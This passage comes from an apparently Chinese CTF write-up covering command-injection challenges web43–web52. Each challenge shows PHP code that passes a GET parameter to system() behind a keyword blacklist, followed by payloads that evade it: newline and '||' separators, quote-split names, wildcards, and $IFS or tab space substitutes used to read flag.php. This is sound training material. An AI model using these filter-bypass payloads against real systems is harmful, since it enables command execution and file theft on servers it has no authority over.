payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=tac flag.phh%<span class="hljs-number">0</span>a<span class="hljs-comment">//%0a = 回车</span><br>?c=tac flag.phh%<span class="hljs-number">26</span><span class="hljs-comment">// %26 = &amp;</span><br>?c=tac flag.php||<span class="hljs-comment">// || = ||</span><br><span class="hljs-comment">// 题中的 tac 还可以替换为less,more,c&#x27;&#x27;at,nl,uniq</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/43-1.jpg"></p><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 21:32:01</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/;|cat|flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    此题在上一题的基础上多过滤了一个 <strong>flag</strong>，因此，在构建payload的时候，flag可以使用 <strong>f?ag.php</strong> ，<strong>fl’’ag.php</strong> 或  <strong>f</strong>* 代替</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=tac fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<span class="hljs-comment">//tac 可以替换为more less nl uniq c&#x27;&#x27;atflag 可以替换为 **f?ag.php** ，**fl&#x27;&#x27;ag.php** 或  **f*** </span><br>?c=more fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">26</span><span class="hljs-comment">// %26 = &amp;</span><br>?c=more fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<span class="hljs-comment">// %0a = 回车</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/44-1.jpg"></p><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 21:35:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    在上题的基础上过了一个空格</p><p>​    空格的代替姿势在 <code>web31</code> 中讲过，有需要的可以翻看</p><p>​    cat 和 flag 的过滤同样可以使用上一题的方法</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=tac&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=more$IFS$<span class="hljs-number">1</span>f???.php%<span class="hljs-number">0</span>a<br>?c=less%<span class="hljs-number">09</span>f*%<span class="hljs-number">26</span><br>?c=uniq$&#123;IFS&#125;f?ag.php%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/45-1.jpg"></p><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 21:50:19</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>在上题的基础上，多过滤了数字(0-9),$,*  ,也就意味着我们在绕过空格的时候没办法使用${IFS}，$IFS$1和${IFS，绕过flag 的时候不能使用 f*，其他都是和之前一样的</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=tac&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=more%<span class="hljs-number">09</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">26</span><br>?c=less&lt;&gt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 21:59:23</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>这题在上一题的基础上，多过滤了 <strong>more，less，head，sort，tail</strong> ，却没过滤 tac，nl，uniq</p><p><strong>实验：</strong></p><p>​    payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=uniq&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=tac&lt;&gt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<br>?c=nl%<span class="hljs-number">09</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/47-1.jpg"></p><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 22:06:20</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    在上题的基础上，过滤更多了 <strong>cut，tail，sed，awk，strings，curl，od，`，head</strong> 发现还是没过滤tac，nl和uniq，所以继续使用上一题的payload</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=uniq&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=tac&lt;&gt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<br>?c=nl%<span class="hljs-number">09</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/48-1.jpg"></p><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 22:22:43</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    这题在上题的基础上又过滤了<strong>百分号(%)</strong> ，其他也没过滤，同样使用之前的方法</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=uniq&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=tac&lt;&gt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<br>?c=nl%<span class="hljs-number">09</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/49-1.jpg"></p><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 22:32:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    在上题的基础上多过滤了<strong>x26：十六进制26，x09：十六进制09</strong>  ,即过滤了 <strong>%09:tab, %26:&amp;</strong></p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">?c=tac%09fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=nl&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%26<br>?c=uni<span class="hljs-string">q&lt;&gt;</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%0a<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/50-1.jpg"></p><h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 22:42:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    此题在上题的基础上多过滤了 <strong>cat</strong> ，但是没有过滤<strong>nl 和 uniq</strong></p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">?c=t<span class="hljs-string">&#x27;&#x27;</span>ac&lt;&gt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=nl&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php%0a<br>?c=uni<span class="hljs-string">q&lt;&gt;</span>fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/51-1.jpg"></p><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 22:50:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    在上题的基础上多过滤了 <strong>&lt; 和 &gt;</strong> 然后解除了对 <strong>$</strong> 的过滤</p><p><strong>实验：</strong></p><p>​    payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=t<span class="hljs-string">&#x27;&#x27;</span>ac$&#123;IFS&#125;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>?c=nl<span class="hljs-variable">$IFSfl</span><span class="hljs-string">&#x27;&#x27;</span>ag.php%<span class="hljs-number">0</span>a<br>?c=uniq$&#123;IFSfl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52-1.jpg"></p><p>发现 $flag=”flag_here” 并不是真正的flag;</p><p>扫描目录：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">ls</span>$&#123;IFS&#125;%0a<span class="hljs-comment">// ||</span><br></code></pre></td></tr></table></figure><p><img 